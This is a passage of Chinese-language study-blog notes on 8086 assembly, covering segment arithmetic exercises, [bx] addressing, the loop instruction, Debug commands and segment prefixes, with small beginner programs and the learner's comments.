ss和stack连接起来了【给编译器看的，伪指令咯】</span><br></pre></td></tr></table></figure><h3 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h3><p>;编写code段中的代码，将a段和b段中的数据相加，结果保存到到c段</p><p>这里可以参考 m1.sam写的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">;编写code段中的代码，将a段和b段中的数据相加，结果保存到到c段</span><br><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">a segment</span><br><span class="line">db 1,2,3,4,5,6,7,8</span><br><span class="line">a ends</span><br><span class="line"></span><br><span class="line">b segment </span><br><span class="line">db 1,2,3,4,5,6,7,8</span><br><span class="line">b ends</span><br><span class="line"></span><br><span class="line">c segment</span><br><span class="line">db 0,0,0,0,0,0,0,0</span><br><span class="line">c ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax, a</span><br><span class="line">mov ds, ax;这里把ds中指向a也就是说需要用到a中的值的时候是用的ds:[bx]来索引</span><br><span class="line"></span><br><span class="line">mov ax, b</span><br><span class="line">mov es, ax;这里把es中指向b【段地址】</span><br><span class="line"></span><br><span class="line">;mov ax,c</span><br><span class="line">;mov ss,ax;这里把ss中指向了c</span><br><span class="line">;mov sp,8</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:mov dl,ds:[bx];这里把a中的第一个数据放进去</span><br><span class="line">add dl,es:[bx];</span><br><span class="line">;sub bx,1</span><br><span class="line">;inc bx;自己加上去</span><br><span class="line">;这里已经把a和b中的值相加放到了dl中，所以现在需要把dl中的值放入c中</span><br><span class="line">;也就是需要有一个 mov c地址,dl,当然这个c地址也要递增也需要用到bx，所以上面的inc bx先不慌加</span><br><span class="line">;智商有限，这个只剩下了ss栈段，我们把c定义成栈，然后把数据放入栈也可以吧</span><br><span class="line">;push dl</span><br><span class="line">;loop s;总体的思路就是吧c当作栈段，然后吧数据push进去，这里push的时候要注意是栈顶也就是sp指的位置，sp-2</span><br><span class="line">;卧槽，写一半的时候发现push 是sp-2，这里是内存单元是8个字节，所以不能用push</span><br><span class="line"></span><br><span class="line">;所以这里就不能用ss 也不能用push 只能用ds咯</span><br><span class="line"></span><br><span class="line">push ds ;原本的ds是a这里零时用一下，所以需要把ds保护起来，也就是放入栈中</span><br><span class="line">mov ax,c</span><br><span class="line">mov ds,ax;现在的ds是指向c</span><br><span class="line">mov ds:[bx],dl</span><br><span class="line">pop ds;这里把ds还原</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>;只能用push指令将a段中的前8个字型数据，逆序存储到b段中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">;只能用push指令将a段中的前8个字型数据，逆序存储到b段中</span><br><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">a segment</span><br><span class="line">dw 1,2,3,4,5,6,7,8,9,0ah,0bh,0ch,0eh,0fh,0ffh</span><br><span class="line">a ends</span><br><span class="line"></span><br><span class="line">b segment </span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">b ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">;首先，只能用push说明，b段的段地址也就是我们定义的栈段的段地址，然后把a中的玩意push进去就好了三</span><br><span class="line">mov ax,a</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">mov ax,b</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:push ds:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">ends start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-[BX]和loop指令（5）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-5-BX-%E5%92%8Cloop%E6%8C%87%E4%BB%A4/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-5-BX-%E5%92%8Cloop%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="描述性符号“-”"><a href="#描述性符号“-”" class="headerlink" title="描述性符号“()”"></a>描述性符号“()”</h3><p>描述性符号()来表示一个寄存器或者一个内存单元中的！！内容！！</p><p>只能用来描述罢了 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">举个例子：</span><br><span class="line">1.ax中的内容是0010H则</span><br><span class="line">(ax)=0010H</span><br><span class="line">2.2000:1000处的内容为0010H则</span><br><span class="line">(21000H)=0010H</span><br><span class="line">3.对于mov ax,[2]的功能，我们可以这样来描述：</span><br><span class="line">(ax)=((ds)*16+2)</span><br><span class="line">4.对于push ax</span><br><span class="line">(sp)=(sp-2) ; 一定要注意是先改掉sp的位置在入栈</span><br><span class="line">((ss)*16+(sp))=(ax) ;这个就是把ax中的值入栈</span><br><span class="line">5.对于pop</span><br><span class="line">(ax)=((ss)*16+(sp))</span><br><span class="line">(sp)=(sp)+2</span><br></pre></td></tr></table></figure><h3 id="约定符号idata表示常量"><a href="#约定符号idata表示常量" class="headerlink" title="约定符号idata表示常量"></a>约定符号idata表示常量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">比如说 mov ax,[idata] 就代表 mov ax,[1] mov ax,[2] </span><br><span class="line"></span><br><span class="line">在这里回顾一个知识点,段寄存器比如ds</span><br><span class="line">不能使用</span><br><span class="line">mov ds,[1]</span><br><span class="line">所以在这里段寄存器就不能使用</span><br><span class="line">mov ds,[idata]</span><br><span class="line">因为段寄存器只能通过其他的寄存器来赋予</span><br><span class="line">mov ds,[ax]</span><br></pre></td></tr></table></figure><h2 id="1-bx"><a href="#1-bx" class="headerlink" title="1.[bx]"></a>1.[bx]</h2><h3 id="bx-和内存单元的描述"><a href="#bx-和内存单元的描述" class="headerlink" title="[bx]和内存单元的描述"></a>[bx]和内存单元的描述</h3><p>1.[bx]是什么呢？</p><p>​    和[0]有些类似【这个[0]是在之前的ds:[]中有遇到的数据的段地址】[0]表示内存单元，它的偏移地址是0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[0] ;这个是以字为大小的</span><br><span class="line">mov al,[0] ;这个是以字节为大小的</span><br></pre></td></tr></table></figure><p>2.我们要完整地描述一个内存单元，需要俩种信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.内存单元的地址</span><br><span class="line">2.内存单元的长度【类型】</span><br></pre></td></tr></table></figure><p>3.我们在使用[0]表示一个内存单元的时候 ， 0表示单元的偏移地址，段地址默认是ds！！单元的长度【类型】是由指令中的其他操作对象所指出的【寄存器，ax ，al】</p><p>4.[bx]同样也表示一个内存单元，它的偏移地址在bx中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]</span><br><span class="line">mov al,[bx]</span><br><span class="line"></span><br><span class="line">为什么要这么写呢，而不是直接 mov ax,[0]?</span><br><span class="line">是因为：编译器和debug的认知不一样，在debug中它认为 mov ax,[0]就是把偏移地址=0的内存内容放进ax存储器中，但是!!在编译器中它会认为是mov ax,0 而不是mov ax,[0],</span><br><span class="line">所以在使用编译器写的时候，需要使用到[bx]这样</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">mov bx,[0]</span><br><span class="line">mov ax,[bx]</span><br><span class="line">这样写就和在debug中</span><br><span class="line">mov ax,[0]</span><br><span class="line">是一样的</span><br></pre></td></tr></table></figure><p>5.下面来简单的看一串代码分析分析最后的样子应该是什么样子的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2000H;在内存中21000H 是BE 21001H 是00</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,1000H</span><br><span class="line">mov ax,[bx];这里是把ds:[bs]中的内容放入ax中 也就是段地址:偏移地址==2000H:1000H也就是物理地址等</span><br><span class="line">inc bx于2000H*16+1000H ==&gt;21000H</span><br><span class="line">inc bx ;这个inc就是自加1就和++一样</span><br><span class="line">mov [bx],ax</span><br><span class="line">inc bx</span><br><span class="line">inc bx</span><br><span class="line">mov [bx],ax</span><br><span class="line">inc bx</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">mov [bx],al</span><br><span class="line"></span><br><span class="line">一定要记住：高存高，低存低</span><br></pre></td></tr></table></figure><p>最后得到应该是 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">21000HBE</span><br><span class="line">21001H00</span><br><span class="line">21002HBE</span><br><span class="line">21003H00</span><br><span class="line">21004HBE</span><br><span class="line">21005HBE</span><br><span class="line">21006HBE</span><br><span class="line">21007H</span><br></pre></td></tr></table></figure><h2 id="2-Loop指令"><a href="#2-Loop指令" class="headerlink" title="2.Loop指令"></a>2.Loop指令</h2><p>1.英文单词loop由循环的意思，显然这个指令就是和循环由关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">俩步走</span><br><span class="line">1.CX=CX-1【这里是CX哦 而不是CS】【CX是一个新的通配符】</span><br><span class="line">2.判断cx中的值，不为0则跳转到标号处，如果是0则执行吓一条指令</span><br></pre></td></tr></table></figure><p>2.这说明，CX中的值影响着LOOP指令的执行结果</p><p>3.通常下，我们用loop指令来实现循环功能CX中存放着循环的次数</p><h3 id="小小的练习1"><a href="#小小的练习1" class="headerlink" title="小小的练习1"></a>小小的练习1</h3><p>1.编程计算：2^12</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,2</span><br><span class="line">mov cx,11;这里来定义一个11次循环</span><br><span class="line">s:add ax,ax;这里的s就是标号【可以随便定义】</span><br><span class="line">loop s;这里就类似于jmp 跳到了s去运行add ax,ax</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这里有一个标号: s 【这个东西是可以随便定义的】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230410193828528.png" alt="image-20230410193828528"></p><p>注意看这里 LOOP 0006 这个0006其实就是 s 【标号】 也就是IP的值 也就是CS:IP的偏移地址，所以这个标号是可以随便定义的【名字】，它总会跳到上这个标号的的偏移地址的位置</p><h3 id="小小的总结"><a href="#小小的总结" class="headerlink" title="小小的总结"></a>小小的总结</h3><p>1.在CX中存放循环次数【只能是用CX 不能使用其他的！！】</p><p>2.loop指令中的标号所表示前面</p><p>3.要循环执行的程序段，要写在标号和loop指令的中间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov cx,循环次数</span><br><span class="line">s:循环执行的程序段</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><h3 id="小小的练习2"><a href="#小小的练习2" class="headerlink" title="小小的练习2"></a>小小的练习2</h3><p>1.用加法计算123×236，结果放在ax中</p><p>2.分析一下咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我有点蠢 就想到了将123加236次</span><br><span class="line">设置ax,0 然后循环 add, ax,ax 236次</span><br></pre></td></tr></table></figure><p>写代码咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0</span><br><span class="line">mov cx,236</span><br><span class="line">s:add ax,123</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>3.卧槽傻逼了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以用236  +123次</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0</span><br><span class="line">mov cx,123</span><br><span class="line">s:add ax,236</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="3-在Debug中跟踪用loop指令实现的循环语句"><a href="#3-在Debug中跟踪用loop指令实现的循环语句" class="headerlink" title="3.在Debug中跟踪用loop指令实现的循环语句"></a>3.在Debug中跟踪用loop指令实现的循环语句</h2><p>1.将ffff:0006单元中的值*3后赋值给dx</p><p>补充一点知识点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ffff:0006单元的中值 一个字节单元的值，也就是【XXH】但是通用寄存器dx的内存空间大小是字【XXXXH】</span><br><span class="line"></span><br><span class="line">这里要知道:10和0010虽然那个不一样大，但是值是一样大的，所以这里要使用dl而不是，如果使用了dx，则dx中存放的值就是ffff:0006和ffff:0007一起组合在一起的字</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ok，现在来分析咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">也就是说：我们不能直接使用dx 【这里视频里面用的ax，所以我们也用ax】</span><br><span class="line">所以我们应该令(ah)=0,(al)=(ffff6H)</span><br></pre></td></tr></table></figure><p>哈哈哈，写代码咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0ffffH;在汇编源程序中，数据是不能以字母开头的，所以要+0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,6</span><br><span class="line">mov al,[bx]</span><br><span class="line">mov ah,0</span><br><span class="line">mov dx,0</span><br><span class="line"></span><br><span class="line">mov cx,3</span><br><span class="line">s: add dx,ax</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>问题来咯，如果是要成1000次，这不得+1000次，在用debug跟踪的时候不得t1000次，这不得把我累死</p><p>于是乎我们有了G命令来解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g 命令是debug中的命令 </span><br><span class="line">用法：g 偏移地址  ; 这样它就会跳到你所指向的偏移地址的地方而且中间的代码都会运行完全，循环也会指向完全</span><br></pre></td></tr></table></figure><p>实操一下咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用 u CS:IP来查看一下咯</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230410203021347.png" alt="image-20230410203021347"></p><p>emmmm 这个dx的值看着有点奇怪，</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230410203359405.png" alt="image-20230410203359405"></p><p>卧槽，这个好像不对耶，我左思右想………会不会是al溢出了哦【哈哈哈，一看就是溢出了】</p><p>这种情况咋解决呢？【书上和视频里面没有，全靠我自己咯】</p><p>tmd 我是傻逼  这个地方是123不是123H</p><p>所以代码没有问题</p><p>补充一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我在调试的时候，发现</span><br><span class="line">mov al,0 </span><br><span class="line">不能写成 mov al,00</span><br><span class="line">至于为什么</span><br><span class="line">我也不知道</span><br></pre></td></tr></table></figure><h2 id="4-Debug和汇编编译器Masm对指令的不同处理"><a href="#4-Debug和汇编编译器Masm对指令的不同处理" class="headerlink" title="4.Debug和汇编编译器Masm对指令的不同处理"></a>4.Debug和汇编编译器Masm对指令的不同处理</h2><p>1.debug和编译器中的不同理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.mov ax,[0]</span><br><span class="line">这个在编译器里面写会被理解成 </span><br><span class="line">mov ax,0这样就会犯错</span><br><span class="line">但是在debug中就可以这么写</span><br><span class="line"></span><br><span class="line">2.在debug中，默认的就是16进制</span><br><span class="line">但是在编译器中16进制一定要写H</span><br><span class="line"></span><br><span class="line">但是如果我们就是想在编译中写入[0]这样的形式呢？</span><br><span class="line">那就需要写上段地址</span><br><span class="line">mov ax,ds:[0]</span><br></pre></td></tr></table></figure><p>2.在debug中的一些命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r 查看</span><br><span class="line">t 运行一步</span><br><span class="line">u 把机器码转成汇编语言</span><br><span class="line">a 以汇编的形式写入</span><br><span class="line">a cs:ip 回车</span><br><span class="line">d 查看</span><br><span class="line">d 段地址:偏移地址</span><br></pre></td></tr></table></figure><h2 id="5-loop和-bx-的联合应用"><a href="#5-loop和-bx-的联合应用" class="headerlink" title="5.loop和[bx]的联合应用"></a>5.loop和[bx]的联合应用</h2><p>1.在计算处的结果存放在dx中，要稍微的判断一下这个值，是否能完美的装入dx中国，会不会溢出？</p><p>2.在计算ffff:0~ffff:b单元的数据和，不能将数据直接累加到dx中，因为没一个单元中的数据都是8位的，不能直接加到16位寄存器dx中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">那是否可以加到dl中呢？</span><br><span class="line">同样的问题，不能丢失数据</span><br></pre></td></tr></table></figure><p>3.所以这里有2个问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.类型匹配的问题</span><br><span class="line">2.结果越界的问题</span><br></pre></td></tr></table></figure><p>4.解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们将内存单元的8位数据赋值到一个16位寄存器ax中，在将ax中的数据累加到dx中，从而使得运算对象的类型匹配，并且不会越界</span><br></pre></td></tr></table></figure><p>.在计算ffff:0~ffff:b单元的数据和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0ffffH</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov dx,0</span><br><span class="line"></span><br><span class="line">mov cx,12</span><br><span class="line"></span><br><span class="line">s:mov al,[bx];这里就是把ds:[bx]中的值放入al中</span><br><span class="line">    mov ah,0;我感觉这个地方有点浪费了，但是我也不知道如何改进，</span><br><span class="line">    add dx,ax</span><br><span class="line">    inc bx;inc 就是自增</span><br><span class="line">    loop s</span><br><span class="line">   </span><br><span class="line">   mov ax,4c00H</span><br><span class="line">   int 21h</span><br><span class="line">   </span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>在这里只能用变量 bx 可以用来自增， 不能用常量哦</p><p>mov al,[bx]中的bx就可以看作一个代表内存单元地址的变量，我们可以不写新的指令，仅仅通过改变bx中的数值，改变指令访问的内存单元</p><h2 id="6-段前缀"><a href="#6-段前缀" class="headerlink" title="6.段前缀"></a>6.段前缀</h2><p>1.指令mov ax,[bx]中，内存单元的偏移地址由bx给处，而段地址默认是ds中</p><p>2.我们可以在访问内存单元的指令中显示地给出内存单元的段地址所在的段寄存器</p><p>3.这些出现在访问内存单元中的指令中，用于显示地指明内存单元的段地址的ds，cs，ss，es，在汇编语言中就把这些称为段前缀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在没有用段前缀的时候，就会默认使用ds</span><br></pre></td></tr></table></figure><h2 id="7-一段安全的空间"><a href="#7-一段安全的空间" class="headerlink" title="7.一段安全的空间"></a>7.一段安全的空间</h2><p>我们应该是自由，直接的用汇编语言去操作真实的硬件，了解那些早已被层层系统软件掩盖的真相</p><p>在dos下，一般在0:200这里开始就可以操作</p><h2 id="8-段前缀的使用"><a href="#8-段前缀的使用" class="headerlink" title="8.段前缀的使用"></a>8.段前缀的使用</h2><p>  考虑到一个问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将内存ffff:0~ffff:b单元中的数据拷贝到0:200~0:20b单元中</span><br></pre></td></tr></table></figure><p>分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.0:200~0:20b单元等同于0020:0~0020:b单元，他们描述的是同一段内存空间</span><br><span class="line">2.拷贝过程应用用循环实现：</span><br><span class="line">初始化 : X=0</span><br><span class="line">循环12次</span><br><span class="line">将ffff：X单元中的数据送入0020:X(需要用一个寄存器中转一下咯)</span><br><span class="line">X=X+1</span><br><span class="line">3.在循环中，源单元中ffff:X和目标单元的0020:X的偏移地址X是变量。我们用bx来存放</span><br><span class="line">4.我们用将0:200~0:20b用0020：0~0020：b描述，就是为了使目标单元的偏移地址和源始单元的偏移地址从同一数值0开始</span><br></pre></td></tr></table></figure><p>写代码咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov bx,0;(bx)=0，偏移地址从0开始</span><br><span class="line">mov cx,12;(cx)=12，循环12次</span><br><span class="line"></span><br><span class="line">s:mov ax,0ffffH</span><br><span class="line">mov ds,ax;(ds)=0ffffh</span><br><span class="line">mov dl,[bx];(dl)=((ds)*16+(bx)),将ffff:bx中的数据送入dl中</span><br><span class="line">mov ax,0020H</span><br><span class="line">mov ds,ax;(ds)=0020h</span><br><span class="line">mov [bx],dl((ds)*16+(bx))=(dl),将dl的数据送入0020：bx中</span><br><span class="line">inc bx;(bx)=(bx)+1</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>分析一下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.因为原单元ffff:X和目标单元0020:X相聚大于64KB，在不同的64KB段里，程序中每次都是设置俩次的ds，</span><br><span class="line">这样的效率不高</span><br><span class="line">2.所以，我们可以使用2个段寄存器分别存放原单元ffff:x和目标单元0020:x的段地址，这样就可以省略循环中需要重复做的12次设置ds的程序段</span><br><span class="line">这里的俩个段段寄存器，一个是ds 一个是es</span><br></pre></td></tr></table></figure><p>改进的代码来咯</p><figure class="highlight 